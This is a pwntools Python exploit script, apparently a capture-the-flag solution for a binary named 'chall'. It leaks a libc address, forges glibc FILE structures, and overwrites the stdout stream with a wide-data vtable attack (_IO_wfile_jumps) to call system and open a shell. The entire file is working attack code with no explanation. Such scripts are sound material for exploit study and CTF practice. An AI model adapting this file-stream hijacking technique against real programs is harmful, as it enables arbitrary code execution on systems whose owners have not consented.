from pwn import *

# Set up pwntools for the correct architecture
exe = "./chall"
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("", )
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* main+918
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _wide_data = 0,
              _mode = 0):
    file_struct = p64(_flags)+ \
    p64(_IO_read_ptr) + \
    p64(_IO_read_end) + \
    p64(_IO_read_base) + \
    p64(_IO_write_base) + \
    p64(_IO_write_ptr) + \
    p64(_IO_write_end) + \
    p64(_IO_buf_base) + \
    p64(_IO_buf_end) + \
    p64(_IO_save_base) + \
    p64(_IO_backup_base) + \
    p64(_IO_save_end) + \
    p64(_IO_marker) + \
    p64(_IO_chain) + \
    p32(_fileno)
    file_struct = file_struct.ljust(0x88, b"\x00")
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, b"\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, b'\x00')
    file_struct += p32(_mode) + p32(0)
    file_struct = file_struct.ljust(0xd8-20, b"\x00")
    file_struct += p64(libc.sym.system) + p64(fp+0x60)
    return file_struct

def vuln_FS(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _wide_data = 0,
              _mode = 0):
    file_struct = b" sh\x00" + p32(0) + \
    p64(_IO_read_ptr) + \
    p64(_IO_read_end) + \
    p64(_IO_read_base) + \
    p64(_IO_write_base) + \
    p64(_IO_write_ptr) + \
    p64(_IO_write_end) + \
    p64(_IO_buf_base) + \
    p64(_IO_buf_end) + \
    p64(_IO_save_base) + \
    p64(_IO_backup_base) + \
    p64(_IO_save_end) + \
    p64(_IO_marker) + \
    p64(_IO_chain) + \
    p32(_fileno)
    file_struct = file_struct.ljust(0x88, b"\x00")
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, b"\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, b'\x00')
    file_struct += p32(_mode) + p32(0)
    file_struct = file_struct.ljust(0xd8-20, b"\x00")
    file_struct += p64(libc.sym.system) + p64(fp+0x60)
    return file_struct


r = start()

sla(b"What size to allocate?\n", str(33554432).encode())
sla(b"Which file to read? (1-3)\n", str(7).encode())

# leak phase
ru(b"Allocated you a chunk @ ")
fp = int(rl()[:-1], 16)
libc.address = fp + 33558512
log.info(f"libc: {hex(libc.address)}")

sl(pack_file(_flags=0xfbad2088,_IO_buf_base=libc.sym._IO_2_1_stdout_, _IO_buf_end=(libc.sym._IO_2_1_stdout_+0x110), _fileno=0, _lock=(fp-16))[:0x90-1])
pause()
sl(b"\x00"*0x100 + p64(fp))

# overwrite the stdout file struct with the wide table exploit
fp = libc.sym._IO_2_1_stdout_
sl((vuln_FS(_lock=(fp-16), _wide_data=(fp-16), _IO_write_ptr=1) + p64(libc.sym._IO_wfile_jumps)).ljust(0x100, b"\x00"))

r.interactive()
